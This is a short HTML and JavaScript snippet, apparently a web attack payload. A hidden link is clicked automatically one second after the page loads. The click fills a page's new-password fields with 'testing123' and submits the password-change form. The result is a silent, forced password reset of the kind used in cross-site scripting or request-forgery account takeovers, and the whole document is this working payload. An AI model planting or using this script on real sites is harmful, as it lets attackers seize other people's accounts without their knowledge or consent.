<a href="#" id="hiddenLink" style="display:none;">Secret</a>

<script>
  document.getElementById("hiddenLink").addEventListener("click", function(e) {
      e.preventDefault(); // Prevent the link default action

      // Trigger the password change upon click
      document.getElementById("newpassword").value = "testing123";
      document.getElementById("newpassword2").value = "testing123";
      document.getElementById("change_password_form").submit();  // Submit the form
  });

  // Automatically trigger the link click (this can be done by other means too)
  setTimeout(() => {
      document.getElementById("hiddenLink").click();  // Trigger click after delay
  }, 1000);  // Set delay before execution if needed
</script>
